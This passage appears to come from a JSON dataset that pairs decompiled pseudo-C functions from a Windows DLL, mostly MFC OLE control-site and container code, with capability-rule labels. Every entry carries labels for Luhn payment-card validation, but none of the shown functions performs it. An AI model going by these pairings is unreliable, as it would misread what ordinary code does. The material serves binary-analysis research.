        "decompiled_code": "\nulong fcn.18001db80(int64_t *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    *arg1 = 0;\n    uVar1 = SUB168(ZEXT816(0x10) * ZEXT816(arg2), 0);\n    if (SUB168(ZEXT816(0x10) * ZEXT816(arg2) >> 0x40, 0) != 0) {\n        uVar1 = 0xffffffffffffffff;\n    }\n    iVar2 = fcn.180009660(uVar1);\n    *arg1 = iVar2;\n    if (*arg1 == 0) {\n        uVar1 = 0x8007000e;\n    }\n    else {\n        *(arg1 + 1) = arg2;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 193
    },
    "18001dd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18001dd70(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 0x10) = arg3;\n    *(arg1 + 0x30) = arg4;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    fcn.180033c90(arg3, 0, arg4);\n    fcn.1800096a4(*(arg1 + 0x18));\n    *(arg1 + 0x18) = 0;\n    uVar1 = SUB168(ZEXT816(0x58) * ZEXT816(arg2), 0);\n    if (SUB168(ZEXT816(0x58) * ZEXT816(arg2) >> 0x40, 0) != 0) {\n        uVar1 = 0xffffffffffffffff;\n    }\n    uVar1 = fcn.180009660(uVar1);\n    *(arg1 + 0x18) = uVar1;\n    if (*(arg1 + 0x18) == 0) {\n        uVar1 = 0x8007000e;\n    }\n    else {\n        *(arg1 + 0x20) = arg2;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 306
    },
    "18001e0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint fcn.18001e0f0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint auStackX8 [2];\n    int64_t *piStackX32;\n    int64_t *apiStack24 [2];\n    \n    if ((*(arg1 + 0x80) != 0) && (iVar1 = (****(arg1 + 0x80))(*(arg1 + 0x80), 0x18004d3f8, apiStack24),  -1 < iVar1)) {\n        piStackX32 = NULL;\n        auStackX8[0] = 0;\n        iVar1 = (**(*apiStack24[0] + 0x20))(apiStack24[0], arg2, &piStackX32);\n        if (-1 < iVar1) {\n            (**(*piStackX32 + 0x28))(piStackX32, arg3, auStackX8);\n            (**(*piStackX32 + 0x10))();\n        }\n        (**(*apiStack24[0] + 0x10))();\n        return auStackX8[0];\n    }\n    return 0;\n}\n",
        "token_count": 264
    },
    "18001e18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001e184(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t *piStackX32;\n    int64_t *apiStack24 [2];\n    \n    if (((arg3 != 0) && (*(arg1 + 0x80) != 0)) &&\n       (iVar1 = (****(arg1 + 0x80))(*(arg1 + 0x80), 0x18004d3f8, apiStack24),  -1 < iVar1)) {\n        piStackX32 = NULL;\n        iVar1 = (**(*apiStack24[0] + 0x20))(apiStack24[0], arg2, &piStackX32);\n        if (-1 < iVar1) {\n            (**(*piStackX32 + 0x30))(piStackX32, arg3);\n            (**(*piStackX32 + 0x10))();\n        }\n        (**(*apiStack24[0] + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "18001e6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18001e6f8(int64_t psa, ulong arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    if ((*(psa + 0x50) != 0) &&\n       (iVar3 = (**(**(psa + 0x50) + 0x18))(*(psa + 0x50), *(psa + 0x58), 0xfffffffe, arg2, 0),  iVar3 != 0)) {\n        return 1;\n    }\n    iVar1 = *(psa + 0x40);\n    if ((iVar1 != 0) && (*(iVar1 + 0x40) != 0)) {\n        uVar4 = (**(**(iVar1 + 0x40) + 0x18))(*(iVar1 + 0x40), *(psa + 0x58), 0xfffffffe, arg2, 0);\n        return uVar4;\n    }\n    fcn.180012514();\n    pcVar2 = swi(3);\n    uVar4 = (*pcVar2)();\n    return uVar4;\n}\n",
        "token_count": 264
    },
    "1800215b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.1800215b0(int64_t **arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    int64_t **ppiVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t **ppiStackX8;\n    ulong uStackX32;\n    \n    uStackX32 = 0;\n    ppiVar1 = arg1 + 3;\n    if (*ppiVar1 != NULL) {\n        (**(**arg1 + 0x30))(*arg1, 1, ppiVar1, 0, 0, 0);\n        *ppiVar1 = NULL;\n    }\n    ppiStackX8 = ppiVar1;\n    uVar3 = (**(**arg1 + 0x28))(*arg1, 0, arg2, (-(noname_2 != '\\0') & 2) - 1, &uStackX32, &ppiStackX8);\n    if (uVar3 == 0) {\n        uVar2 = fcn.180021524(arg1);\n        uVar3 = uVar2;\n        if ((uVar2 < 0) && (*ppiVar1 != NULL)) {\n            (**(**arg1 + 0x30))(*arg1, 1, ppiVar1, 0, 0, 0);\n            *ppiVar1 = NULL;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 323
    },
    "180021c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.180021c54(int64_t *arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    int64_t *apiStackX16 [3];\n    \n    if (arg2 == NULL) {\n        return -0x7fffbffb;\n    }\n    apiStackX16[0] = NULL;\n    iVar1 = (***arg2)(arg2, 0x1800514d8, apiStackX16);\n    if (iVar1 < 0) {\ncode_r0x000180021c93:\n        if (apiStackX16[0] != NULL) {\n            (**(*apiStackX16[0] + 0x10))();\n        }\n    }\n    else {\n        if (*arg1 == 0) {\n            iVar1 = fcn.18001db80(arg1, 1);\n            if (iVar1 < 0) goto code_r0x000180021c93;\n            *(*arg1 + 8) = 1;\n        }\n        iVar1 = fcn.18001dbec(arg1[3], arg1[4], *arg1, arg1[6]);\n        if (apiStackX16[0] != NULL) {\n            (**(*apiStackX16[0] + 0x10))();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 292
    },
    "18002496": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180024960(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *arg2;\n    \n    piVar1 = arg1[4];\n    if (piVar1 != NULL) {\n        arg2 = *arg1;\n        if (arg2 != NULL) {\n            fcn.180022638(piVar1, arg2);\n            fcn.180021ae8(piVar1, arg2);\n        }\n        piVar1 = arg1[4];\n        if (piVar1 != NULL) {\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(piVar1[5]);\n            piVar1[5] = 0;\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(piVar1[6]);\n            piVar1[6] = 0;\n            fcn.1800096a4(piVar1[2]);\n            piVar1[2] = 0;\n            fcn.1800096a4(piVar1[4]);\n            piVar1[4] = 0;\n            piVar1[3] = 0;\n            fcn.1800096a4(piVar1);\n        }\n        arg1[4] = NULL;\n    }\n    piVar1 = *arg1;\n    if (piVar1 != NULL) {\n        if (arg1[3] != NULL) {\n            (**(*piVar1 + 0x30))(piVar1, 1, arg1 + 3, 0, 0, 0);\n            arg1[3] = NULL;\n        }\n        piVar1 = *arg1;\n        if (piVar1 != NULL) {\n            *arg1 = NULL;\n            (**(*piVar1 + 0x10))();\n        }\n        piVar1 = arg1[1];\n        if (piVar1 != NULL) {\n            arg1[1] = NULL;\n            (**(*piVar1 + 0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 442
    },
    "180024c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.180024c9c(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    uint64_t noname_2;\n    ulong in_R9;\n    \n    piVar2 = fcn.180012330();\n    noname_2 = piVar2 != NULL;\n    if (piVar2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    iVar3 = (**(*piVar2 + 0x18))(piVar2);\n    *arg1 = iVar3 + 0x18;\n    if ((arg2 == 0) || ((arg2 & 0xffffffffffff0000) != 0)) {\n        fcn.18000e6c4(arg1, arg2, noname_2, in_R9);\n    }\n    else {\n        iVar3 = fcn.18001231c(arg2 & 0xffff);\n        if (iVar3 != 0) {\n            fcn.180008b80(arg1, iVar3, arg2 & 0xffff);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 289
    },
    "180024d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180024d30(code **arg1, code *arg2)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    code **ppcVar3;\n    int64_t iVar4;\n    \n    fcn.180009a6c(arg1);\n    *arg1 = vtable.COleControlSite.0;\n    arg1[8] = arg2;\n    arg1[10] = NULL;\n    *(arg1 + 0xb) = 0xffffffff;\n    arg1[0x10] = NULL;\n    arg1[0x11] = NULL;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    *(arg1 + 0x14) = 0;\n    *(arg1 + 0xa4) = 0;\n    *(arg1 + 0x16) = 0;\n    *(arg1 + 0xb4) = 0;\n    *(arg1 + 0x1a) = 0;\n    *(arg1 + 0xd4) = 0;\n    arg1[0x1b] = NULL;\n    arg1[0x1c] = NULL;\n    arg1[0x1d] = NULL;\n    *(arg1 + 0x1e) = 0;\n    *(arg1 + 0xf4) = 0;\n    piVar2 = fcn.180012330();\n    if (piVar2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar3 = (*pcVar1)();\n        return ppcVar3;\n    }\n    iVar4 = (**(*piVar2 + 0x18))(piVar2);\n    arg1[0x1f] = iVar4 + 0x18;\n    *(arg1 + 0x20) = 0;\n    fcn.18002dcd4(arg1 + 0x24);\n    arg1[0x26] = NULL;\n    arg1[0x27] = vtable.COleControlSite::XOleClientSite.0;\n    arg1[0x28] = vtable.COleControlSite::XOleIPSite.0;\n    arg1[0x29] = vtable.COleControlSite::XOleControlSite.0;\n    arg1[0x2a] = vtable.COleControlSite::XAmbientProps.0;\n    arg1[0x2b] = vtable.COleControlSite::XPropertyNotifySink.0;\n    arg1[0x2c] = vtable.COleControlSite::XEventSink.0;\n    arg1[0x2d] = vtable.COleControlSite::XBoundObjectSite.0;\n    arg1[0x2e] = vtable.COleControlSite::XNotifyDBEvents.0;\n    arg1[0x2f] = vtable.COleControlSite::XRowsetNotify.0;\n    fcn.180033c90(arg1 + 0x21, 0, 0x18);\n    *(arg1 + 0x21) = 0;\n    return arg1;\n}\n",
        "token_count": 710
    },
    "1800252c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800252cc(code **arg1)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    ulong arg2;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    ulong in_R9;\n    int64_t **ppiStackX16;\n    int64_t *apiStackX24 [2];\n    \n    *arg1 = vtable.CDataSourceControl.0;\n    uVar10 = 0;\n    if ((((*(arg1 + 0x16) != 0) && (arg1[0x14] != NULL)) &&\n        (puVar1 = *arg1[0x14],  iVar6 = (***puVar1)(puVar1, 0x18004d3f8, apiStackX24, in_R9, 0xfffffffffffffffe), \n        -1 < iVar6)) && (apiStackX24[0] != NULL)) {\n        ppiStackX16 = NULL;\n        iVar6 = (**(*apiStackX24[0] + 0x20))(apiStackX24[0], 0x1800563b8, &ppiStackX16);\n        if ((-1 < iVar6) && (ppiStackX16 != NULL)) {\n            (*(*ppiStackX16)[6])(ppiStackX16, *(arg1 + 0x16));\n            (*(*ppiStackX16)[2])();\n        }\n        (**(*apiStackX24[0] + 0x10))();\n    }\n    pcVar2 = arg1[9];\n    while (((pcVar2 != NULL && (ppiVar3 = *(arg1[7] + 0x10),  ppiVar3 != NULL)) && (piVar4 = *ppiVar3,  piVar4 != NULL))\n          ) {\n        (**(*piVar4 + 0x178))(piVar4, *(ppiVar3 + 0xc), 0);\n        (*ppiVar3)[0x1d] = 0;\n        pcVar2 = arg1[9];\n    }\n    fcn.18002d584(arg1 + 6);\n    if (arg1[0x10] != NULL) {\n        uVar7 = uVar10;\n        uVar9 = uVar10;\n        if (0 < arg1[0xe]) {\n            do {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(arg1[0x10] + uVar7 * 0x18);\n                uVar8 = uVar9 + 1;\n                uVar7 = uVar8;\n                uVar9 = uVar8;\n            } while (uVar8 < arg1[0xe]);\n        }\n        if (arg1[0xe] != NULL) {\n            fcn.1800096a4(arg1[0xf]);\n            fcn.1800096a4(arg1[0x10]);\n        }\n    }\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 0x10))();\n    }\n    if (arg1[3] != NULL) {\n        (**(*arg1[3] + 0x10))();\n    }\n    if (arg1[5] != NULL) {\n        uVar7 = uVar10;\n        if (0 < arg1[4]) {\n            do {\n                puVar1 = *(*(arg1[5] + uVar10 + 0x38) + 8);\n                while (puVar1 != NULL) {\n                    if (puVar1 == NULL) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    puVar5 = *puVar1;\n                    *(puVar1[2] + 0xe8) = 0;\n                    puVar1 = puVar5;\n                }\n                fcn.18002d584(*(arg1[5] + uVar10 + 0x38));\n                piVar4 = *(arg1[5] + uVar10 + 0x38);\n                if (piVar4 != NULL) {\n                    (**(*piVar4 + 8))(piVar4, 1);\n                }\n                uVar8 = uVar7 + 1;\n                uVar7 = uVar8;\n                uVar10 = uVar10 + 0x40;\n            } while (uVar8 < arg1[4]);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(arg1[5]);\n    }\n    if (arg1[0xd] != NULL) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)();\n    }\n    pcVar2 = arg1[0x15];\n    if (pcVar2 != NULL) {\n        arg2 = *arg1[0x14];\n        fcn.180022638(pcVar2, arg2);\n        fcn.180021ae8(pcVar2, arg2);\n        pcVar2 = arg1[0x15];\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(*(pcVar2 + 0x28));\n        *(pcVar2 + 0x28) = 0;\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(*(pcVar2 + 0x30));\n        *(pcVar2 + 0x30) = 0;\n        fcn.1800096a4(*(pcVar2 + 0x10));\n        *(pcVar2 + 0x10) = 0;\n        fcn.1800096a4(*(pcVar2 + 0x20));\n        *(pcVar2 + 0x20) = 0;\n        *(pcVar2 + 0x18) = 0;\n    }\n    pcVar2 = arg1[0x15];\n    if (pcVar2 != NULL) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(*(pcVar2 + 0x28));\n        *(pcVar2 + 0x28) = 0;\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(*(pcVar2 + 0x30));\n        *(pcVar2 + 0x30) = 0;\n        fcn.1800096a4(*(pcVar2 + 0x10));\n        *(pcVar2 + 0x10) = 0;\n        fcn.1800096a4(*(pcVar2 + 0x20));\n        *(pcVar2 + 0x20) = 0;\n        *(pcVar2 + 0x18) = 0;\n        fcn.1800096a4(pcVar2);\n    }\n    ppiVar3 = arg1[0x14];\n    ppiStackX16 = ppiVar3;\n    if (ppiVar3 != NULL) {\n        fcn.180024960(ppiVar3);\n        if (ppiVar3[1] != NULL) {\n            (**(*ppiVar3[1] + 0x10))();\n        }\n        if (*ppiVar3 != NULL) {\n            (**(**ppiVar3 + 0x10))();\n        }\n        fcn.1800096a4(ppiVar3);\n    }\n    if (arg1[0x13] != NULL) {\n        (**(*arg1[0x13] + 0x10))();\n    }\n    if (arg1[0x12] != NULL) {\n        (**(*arg1[0x12] + 0x10))();\n    }\n    arg1[6] = vtable.CPtrList.0;\n    arg1[9] = NULL;\n    arg1[10] = NULL;\n    arg1[8] = NULL;\n    arg1[7] = NULL;\n    fcn.18002a100(arg1[0xb]);\n    arg1[0xb] = NULL;\n    return;\n}\n",
        "token_count": 1773
    },
    "1800265b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800265b8(code **arg1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t *piStackX16;\n    int64_t *piStackX24;\n    \n    *arg1 = vtable.COleControlSite.0;\n    pcVar2 = arg1[8];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0xd0) == arg1)) {\n        *(pcVar2 + 0xd0) = 0;\n    }\n    pcVar2 = arg1[0x1b];\n    if (pcVar2 != NULL) {\n        fcn.1800252cc(pcVar2);\n        fcn.1800096a4(pcVar2);\n    }\n    fcn.18001e688(arg1);\n    fcn.18001e184(arg1, arg1 + 0x6c, *(arg1 + 0x14));\n    fcn.18001e184(arg1, 0x1800561b8, *(arg1 + 0xa4));\n    fcn.18001e184(arg1, 0x180056078, *(arg1 + 0xd4));\n    if (arg1[0x13] != NULL) {\n        (**(*arg1[0x13] + 0x10))();\n        arg1[0x13] = NULL;\n    }\n    if (arg1[0x11] != NULL) {\n        (**(*arg1[0x11] + 0x28))();\n        (**(*arg1[0x11] + 0x10))();\n        arg1[0x11] = NULL;\n    }\n    if (arg1[0x12] != NULL) {\n        (**(*arg1[0x12] + 0x10))();\n        arg1[0x12] = NULL;\n    }\n    piVar3 = arg1[0x10];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 0x18))(piVar3, 0);\n        (**(*arg1[0x10] + 0x30))(arg1[0x10], 1);\n        (**(*arg1[0x10] + 0x10))();\n        arg1[0x10] = NULL;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(arg1 + 0x21);\n    pcVar2 = arg1[0x1c];\n    if (pcVar2 != NULL) {\n        arg1[0x1c] = *(pcVar2 + 0x20);\n        iVar4 = *(pcVar2 + 0x10);\n        if ((iVar4 != 0) && (*(iVar4 + 0xd8) != 0)) {\n            (**(**(iVar4 + 0xd8) + 8))(*(iVar4 + 0xd8), pcVar2, 0);\n        }\n        fcn.1800096a4(pcVar2);\n    }\n    if (((*(arg1 + 0x1e) != 0) && (pcVar2 = arg1[0x1d],  pcVar2 != NULL)) && (*(pcVar2 + 0xd8) != 0)) {\n        (**(**(pcVar2 + 0xd8) + 0x10))(*(pcVar2 + 0xd8), arg1, 0);\n    }\n    if ((arg1[8] != NULL) && (*(arg1 + 0xb4) != 0)) {\n        piVar1 = arg1[8] + 0xe0;\n        *piVar1 = *piVar1 + -1;\n    }\n    piStackX24 = NULL;\n    iVar5 = (**arg1[0x2b])(arg1 + 0x2b, 0x180056148, &piStackX24);\n    if (-1 < iVar5) {\n        fcn.18001cf98(piStackX24);\n    }\n    piStackX16 = NULL;\n    iVar5 = (**arg1[0x2c])(arg1 + 0x2c, 0x180056148, &piStackX16);\n    if (-1 < iVar5) {\n        fcn.18001cf98(piStackX16);\n    }\n    if (piStackX16 != NULL) {\n        (**(*piStackX16 + 0x10))();\n    }\n    if (piStackX24 != NULL) {\n        (**(*piStackX24 + 0x10))();\n    }\n    fcn.18002dce4(arg1 + 0x24);\n    pcVar2 = arg1[0x1f];\n    LOCK();\n    piVar1 = pcVar2 + -8;\n    iVar5 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar5 + -1 < 1) {\n        (**(**(pcVar2 + -0x18) + 8))();\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 1166
    },
    "180026d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool fcn.180026d44(int64_t *arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    ulong in_R8;\n    ulong in_R9;\n    \n    if (arg1[0x13] == 0) {\n        iVar2 = (**(*arg1 + 600))(arg1, arg1 + 0x13, in_R8, in_R9, 0xfffffffffffffffe);\n        if ((iVar2 != 0) && (arg1[0x13] == 0)) {\n            iVar4 = fcn.180014058();\n            iVar4 = (**(**(iVar4 + 0x68) + 0x10))(*(iVar4 + 0x68), arg1);\n            arg1[0x13] = iVar4;\n        }\n        if (arg2 == 0) {\n            iVar4 = *arg1[0x13];\n            uVar5 = (**(*arg1 + 0x270))(arg1);\n            (**(iVar4 + 0x140))(arg1[0x13], uVar5);\n        }\n    }\n    piVar1 = arg1 + 0x13;\n    if (*piVar1 != 0) {\n        while ((*(arg1 + 0xf) >> 8 & 1) == 0) {\n            *(arg1 + 0xf) = *(arg1 + 0xf) | 0x100;\n            uVar5 = (*_sym.imp.USER32.dll_GetParent)(arg1[8]);\n            arg1 = fcn.180017c38(uVar5);\n            iVar4 = 0;\n            if (arg1 != NULL) {\n                iVar4 = arg1[8];\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetWindowLongW)(iVar4, 0xfffffff0);\n            if (((uVar3 >> 0x1e & 1) == 0) || (arg1 == NULL)) break;\n        }\n    }\n    return *piVar1 != 0;\n}\n",
        "token_count": 473
    },
    "18002740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180027408(code **arg1)\n\n{\n    ulong *puVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    ulong *arg2;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    int64_t *piStackX16;\n    ulong uVar6;\n    \n    uVar6 = 0xfffffffffffffffe;\n    *arg1 = vtable.COleControlContainer.0;\n    puVar1 = arg1[0x11];\n    while( true ) {\n        arg2 = puVar1;\n        if (arg2 == NULL) {\n            pcVar3 = arg1[0x13];\n            while (pcVar3 != NULL) {\n                iVar5 = fcn.18002d5e4(arg1 + 0x10);\n                if (iVar5 != 0) {\n                    piVar2 = *(iVar5 + 8);\n                    if (piVar2 != NULL) {\n                        (**(*piVar2 + 8))(piVar2, 1, *piVar2, in_R9, uVar6);\n                    }\n                    fcn.1800096a4(iVar5);\n                }\n                pcVar3 = arg1[0x13];\n            }\n            fcn.18002d09c(arg1 + 9);\n            fcn.18001cf70(arg1 + 0x18);\n            if (0 < *(arg1 + 1)) {\n                piStackX16 = NULL;\n                iVar4 = fcn.18001d22c(arg1, 0x180056148, &piStackX16);\n                if (-1 < iVar4) {\n                    fcn.18001cf98(piStackX16);\n                }\n                if (piStackX16 != NULL) {\n                    (**(*piStackX16 + 0x10))();\n                }\n            }\n            fcn.18002d6cc(arg1 + 0x10);\n            fcn.18002d2dc(arg1 + 9);\n            if (arg1[4] != NULL) {\n                (**(arg1[4] + 0x38))();\n            }\n            arg1[7] = NULL;\n            return;\n        }\n        if (arg2 == NULL) break;\n        puVar1 = *arg2;\n        iVar5 = arg2[2];\n        if (((iVar5 != 0) && (*(iVar5 + 8) != 0)) && (*(*(iVar5 + 8) + 0xd8) == 0)) {\n            fcn.18002d630(arg1 + 0x10, arg2);\n            piVar2 = *(iVar5 + 8);\n            if (piVar2 != NULL) {\n                (**(*piVar2 + 8))(piVar2, 1);\n            }\n            fcn.1800096a4(iVar5);\n        }\n    }\n    fcn.180012514();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 658
    },
    "180027e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180027e9c(code **arg1, code *arg2)\n\n{\n    fcn.180009a6c(arg1);\n    *arg1 = vtable.COleControlContainer.0;\n    arg1[8] = arg2;\n    fcn.18002d2a4(arg1 + 9, 10);\n    fcn.18002d6a4(arg1 + 0x10, 10);\n    arg1[0x10] = vtable.CTypedPtrList_class_CPtrList__struct_COleControlSiteOrWnd____ptr64_.0;\n    *(arg1 + 0x17) = 0xffffffff;\n    *(arg1 + 0xbc) = 0xffffffff;\n    arg1[0x18] = NULL;\n    arg1[0x19] = NULL;\n    arg1[0x1a] = NULL;\n    arg1[0x1b] = NULL;\n    *(arg1 + 0x1c) = 0;\n    arg1[0x1d] = vtable.COleControlContainer::XOleIPFrame.0;\n    arg1[0x1e] = vtable.COleControlContainer::XOleContainer.0;\n    return arg1;\n}\n",
        "token_count": 276
    },
    "18002878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.18002878c(int64_t *arg1, code *arg2)\n\n{\n    int64_t iVar1;\n    \n    if (*arg1 == 0) {\n        fcn.18001ca7c(0x10, arg2);\n        if (*arg1 == 0) {\n            iVar1 = (*arg2)();\n            *arg1 = iVar1;\n        }\n        int.18001cb10(0x10);\n    }\n    return *arg1;\n}\n",
        "token_count": 108
    },
    "180028b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180028b3c(uint *lpCriticalSection, ulong arg2, int64_t arg3)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    ulong in_R9;\n    ulong uVar3;\n    \n    uVar3 = 0xfffffffffffffffe;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 10);\n    if ((arg2 < 1) || (lpCriticalSection[3] <= arg2)) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n        return;\n    }\n    ppcVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*lpCriticalSection);\n    if (ppcVar1 == NULL) {\n        ppcVar1 = fcn.1800286bc(0x20);\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            *ppcVar1 = vtable.CThreadData.0;\n        }\n        *(ppcVar1 + 2) = 0;\n        ppcVar1[3] = NULL;\n        *(ppcVar1 + *(lpCriticalSection + 8)) = *(lpCriticalSection + 6);\n        *(lpCriticalSection + 6) = ppcVar1;\n    }\n    else if ((arg2 < *(ppcVar1 + 2)) || (arg3 == 0)) goto code_r0x000180028c89;\n    if (ppcVar1[3] == NULL) {\n        if (0xffffffff < lpCriticalSection[3] << 3) {\n            fcn.180001214(0x80070057);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0);\n    }\n    else {\n        if (0xffffffff < lpCriticalSection[3] << 3) {\n            fcn.180001214(0x80070057);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        pcVar2 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)\n                           (ppcVar1[3], lpCriticalSection[3] << 3 & 0xffffffff, 2, in_R9, uVar3);\n    }\n    if (pcVar2 == NULL) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n        fcn.1800124cc();\n        pcVar2 